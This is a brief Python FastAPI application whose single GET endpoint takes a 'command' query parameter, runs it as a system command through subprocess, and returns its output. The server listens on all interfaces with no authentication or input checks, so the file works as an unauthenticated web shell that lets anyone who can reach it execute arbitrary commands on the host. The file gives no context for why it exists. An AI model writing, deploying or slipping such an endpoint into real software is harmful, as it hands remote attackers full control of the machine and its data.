from fastapi import FastAPI, Request
import os
import subprocess

app = FastAPI()
port = int(os.environ.get("PORT", 4000))

@app.get("/")
def read_root(request: Request, command: str):
    proc = subprocess.run(command.split(), capture_output=True, text=True)
    return {"command": command, "out": proc.stdout, "err": proc.stderr, "ret": proc.returncode}

def hello():
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=port)
